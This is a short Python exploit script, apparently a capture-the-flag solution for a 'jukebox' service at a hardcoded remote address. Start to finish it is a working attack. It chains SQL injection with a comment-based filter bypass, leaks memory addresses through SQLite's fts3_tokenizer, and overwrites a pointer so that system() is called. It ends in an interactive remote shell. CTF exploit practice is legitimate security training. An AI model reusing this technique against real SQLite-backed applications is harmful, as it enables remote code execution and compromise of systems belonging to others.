from zio import *

#io = zio("./jukebox")
io = zio(('104.199.132.199', 1990))

io.read_until('name?')
io.write('root\n')
io.read_until('Password:')
io.write('bCtF2016\n')
io.read_until('choice:')
io.write('3\n')
io.read_until('library:')
io.write('!\';select/**/hex(fts3_tokenizer(\'simple\')),2,3;--\n')
io.read_until('Matches:\n')

simple = io.read_until(')')[:-1]
simple = b64(l64(int(simple, 16)))

libsqlite3 = simple - 0x2b4d80
soft_limit = libsqlite3 + 0x2b8168
libc = libsqlite3 - 0x3c5000
system = libc + 0x6fcaa

log('libsqlite3: %s' % hex(libsqlite3), 'red')
log('soft: %s' % hex(soft_limit), 'red')
log('system: %s' % hex(system), 'red')

io.read_until('choice:')
io.write('3\n')
io.read_until('library:')

blob = 'x\'%s\'' % l64(soft_limit - 8).encode('hex')

log('blob: ' + blob, 'red')
io.write('\';select/**/fts3_tokenizer(\'simple\',%s);--\n' % blob)
io.read_until('choice:')
io.write('3\n')
io.read_until('library:')
io.write('\';pragma/**/soft_heap_limit=%d;--\n' % system)

io.read_until('choice:')
io.write('3\n')
io.read_until('library:')

io.write('\';create/**/virtual/**/table/**/a/**/using/**/fts3;\n')
io.write('ls\n')
io.interact()
